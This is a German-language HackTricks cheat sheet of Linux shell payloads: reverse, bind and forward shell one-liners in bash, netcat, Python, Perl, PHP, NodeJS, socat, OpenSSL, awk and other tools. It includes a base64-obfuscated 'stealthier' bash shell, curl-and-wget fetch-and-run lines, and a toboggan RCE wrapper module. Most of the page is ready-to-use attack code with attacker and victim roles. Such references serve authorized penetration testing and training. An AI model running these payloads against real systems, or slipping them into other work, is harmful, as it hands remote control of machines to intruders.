# Shells - Linux

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

**Wenn Sie Fragen zu einer dieser Shells haben, können Sie sie mit** [**https://explainshell.com/**](https://explainshell.com) **überprüfen.**

## Full TTY

**Sobald Sie eine Reverse-Shell erhalten haben, [lesen Sie diese Seite, um ein vollständiges TTY zu erhalten](full-ttys.md)**.

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### Symbol sicherer Shell

Vergessen Sie nicht, auch andere Shells zu überprüfen: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh und bash.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell Erklärung

1. **`bash -i`**: Dieser Teil des Befehls startet eine interaktive (`-i`) Bash-Shell.
2. **`>&`**: Dieser Teil des Befehls ist eine Kurzschreibweise für die **Umleitung sowohl des Standardausgangs** (`stdout`) als auch des **Standardfehlers** (`stderr`) zum **gleichen Ziel**.
3. **`/dev/tcp/<ANGREIFER-IP>/<PORT>`**: Dies ist eine spezielle Datei, die eine TCP-Verbindung zur angegebenen IP-Adresse und Port darstellt.
* Durch **Umleiten der Ausgabe- und Fehlerströme in diese Datei** sendet der Befehl effektiv die Ausgabe der interaktiven Shell-Sitzung an den Rechner des Angreifers.
4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) zum gleichen Ziel wie die Standardausgabe (`stdout`)** um.

### In Datei erstellen und ausführen
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Vorwärtsschale

Bei einer **Remote Code Execution (RCE)**-Verwundbarkeit in einer auf Linux basierenden Webanwendung kann die Erreichung einer umgekehrten Shell durch Netzwerkabwehrmechanismen wie iptables-Regeln oder komplexe Paketfiltermechanismen behindert werden. In solch eingeschränkten Umgebungen besteht ein alternativer Ansatz darin, eine PTY (Pseudo Terminal)-Shell zu erstellen, um effektiver mit dem kompromittierten System zu interagieren.

Ein empfohlenes Tool für diesen Zweck ist [toboggan](https://github.com/n3rada/toboggan.git), das die Interaktion mit der Zielumgebung vereinfacht.

Um toboggan effektiv zu nutzen, erstellen Sie ein auf den RCE-Kontext Ihres Zielsystems zugeschnittenes Python-Modul. Ein Modul mit dem Namen `nix.py` könnte beispielsweise wie folgt strukturiert sein:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
Und dann kannst du ausführen:
```shell
toboggan -m nix.py -i
```
Um direkt eine interaktive Shell zu nutzen, können Sie `-b` für die Integration von Burpsuite hinzufügen und das `-i` entfernen, um einen einfacheren RCE-Wrapper zu erhalten.

Eine weitere Möglichkeit besteht darin, die `IppSec` Forward-Shell-Implementierung [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell) zu verwenden.

Sie müssen lediglich Folgendes anpassen:

- Die URL des verwundbaren Hosts
- Das Präfix und Suffix Ihres Payloads (falls vorhanden)
- Die Art und Weise, wie der Payload gesendet wird (Header? Daten? Zusätzliche Informationen?)

Dann können Sie einfach **Befehle senden** oder sogar den Befehl `upgrade` verwenden, um eine vollständige PTY zu erhalten (beachten Sie, dass Pipes mit einer ungefähren Verzögerung von 1,3 Sekunden gelesen und geschrieben werden).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Überprüfen Sie es unter [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet ist ein Netzwerkprotokoll, das verwendet wird, um eine Verbindung zu einem entfernten System herzustellen. Es ermöglicht die Interaktion mit dem entfernten System über eine textbasierte Schnittstelle. Telnet kann für administrative Aufgaben oder zum Testen der Erreichbarkeit eines Systems verwendet werden. Es ist wichtig zu beachten, dass Telnet unverschlüsselt ist und daher Sicherheitsrisiken birgt. Es wird empfohlen, sicherere Alternativen wie SSH zu verwenden.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Angreifer**
```bash
while true; do nc -l <port>; done
```
Um den Befehl zu senden, schreiben Sie ihn auf, drücken Sie Enter und drücken Sie dann STRG+D (um STDIN zu stoppen)

**Opfer**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

Python ist eine vielseitige Programmiersprache, die von Hackern häufig verwendet wird, um Shell-Skripte zu schreiben und verschiedene Aufgaben im Zusammenhang mit Hacking und Pentesting zu automatisieren. Python bietet eine Vielzahl von Bibliotheken und Frameworks, die das Erstellen von Hacking-Tools erleichtern. Es ist plattformunabhängig und einfach zu erlernen, was es zu einer beliebten Wahl unter Hackern macht.
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl ist eine beliebte Skriptsprache, die von Hackern häufig verwendet wird, um Shell-Skripte zu schreiben und Systeme zu automatisieren. Es bietet leistungsstarke Funktionen für die Textverarbeitung und wird oft für das Erstellen von Exploits und Payloads verwendet.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

Ruby ist eine dynamische, objektorientierte Skriptsprache, die für die Entwicklung von Webanwendungen weit verbreitet ist. Es gibt verschiedene Shells, die mit Ruby verwendet werden können, darunter IRB (Interactive Ruby) und Pry. Diese Shells bieten eine interaktive Umgebung zum Ausführen von Ruby-Code und zum Testen von Skripten.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP ist eine serverseitige Skriptsprache, die hauptsächlich für die Webentwicklung verwendet wird. PHP-Skripte werden auf dem Server ausgeführt, um dynamische Webseiten zu generieren. PHP kann in HTML-Code eingebettet werden und mit verschiedenen Datenbanken wie MySQL, PostgreSQL usw. interagieren.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java ist eine objektorientierte Programmiersprache, die auf der Java Virtual Machine (JVM) läuft. Java-Code wird in Bytecode kompiliert, der von der JVM ausgeführt wird. Java wird häufig für die Entwicklung von Anwendungen, Webanwendungen und mobilen Anwendungen verwendet. Es ist auch eine der beliebtesten Programmiersprachen für die Entwicklung von Android-Apps.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat ist ein vielseitiges Netzwerk-Tool, das Funktionen wie Port-Scanning, Datenübertragung und Port-Weiterleitung bietet. Es kann auch als einfacher Webserver oder Reverse-Proxy verwendet werden. Ncat ist eine leistungsstarke Alternative zum traditionellen Netcat-Tool.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

Golang, auch bekannt als Go, ist eine Open-Source-Programmiersprache, die von Google entwickelt wurde. Sie zeichnet sich durch Effizienz und Geschwindigkeit aus und wird häufig für die Entwicklung von Systemsoftware, Cloud-Diensten und Netzwerkanwendungen verwendet. Golang bietet eine starke Typisierung und eine einfache Syntax, die das Schreiben von Code erleichtert.
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua ist eine leistungsstarke, effiziente, leichtgewichtige, eingebettete Skriptsprache. Lua wird oft für die Erstellung von Skripten und Automatisierungsaufgaben in verschiedenen Anwendungen verwendet. Lua-Skripte können in vielen verschiedenen Umgebungen ausgeführt werden und sind aufgrund ihrer Flexibilität und Einfachheit bei Entwicklern beliebt. Lua wird auch häufig in der Spieleentwicklung und in anderen Bereichen eingesetzt, in denen Skripting erforderlich ist.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS

NodeJS ist eine Open-Source-Plattform, die auf der JavaScript-Laufzeitumgebung von Chrome basiert und es ermöglicht, serverseitige Anwendungen mit JavaScript zu erstellen. NodeJS wird häufig für die Entwicklung von Webanwendungen verwendet und bietet eine Vielzahl von Modulen, die die Entwicklung erleichtern.
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Der Angreifer (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Das Opfer
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind-Shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Umgekehrte Shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk ist eine leistungsstarke Skriptsprache und ein Befehlszeilen-Tool, das häufig zum Analysieren und Verarbeiten von Textdateien in Unix- und Linux-Umgebungen verwendet wird. Es ermöglicht das Extrahieren und Manipulieren von Daten, das Durchsuchen von Dateien nach Mustern und das Ausführen von Aktionen basierend auf diesen Mustern. Awk ist besonders nützlich für die Verarbeitung strukturierter Daten wie CSV-Dateien.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Angreifer**
```bash
while true; do nc -l 79; done
```
Um den Befehl zu senden, schreiben Sie ihn auf, drücken Sie Enter und drücken Sie dann STRG+D (um STDIN zu stoppen)

**Opfer**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk ist eine leistungsstarke Skriptsprache für die Datenverarbeitung und Textmanipulation in Unix- und Linux-Umgebungen. Es wird häufig verwendet, um Textdateien zeilenweise zu verarbeiten und Muster zu durchsuchen und zu extrahieren. Gawk bietet eine Vielzahl von Funktionen, einschließlich eingebauter Funktionen und die Möglichkeit, benutzerdefinierte Funktionen zu definieren. Es ist ein äußerst nützliches Werkzeug für Hacker, um Daten zu analysieren und Skripte für verschiedene Zwecke zu erstellen.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Dies wird versuchen, eine Verbindung zu Ihrem System über den Port 6001 herzustellen:
```bash
xterm -display 10.0.0.1:1
```
Um die umgekehrte Shell zu erhalten, können Sie Folgendes verwenden (die auf Port 6001 lauscht):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

von [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) HINWEIS: Java-Reverse-Shell funktioniert auch für Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Referenzen

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
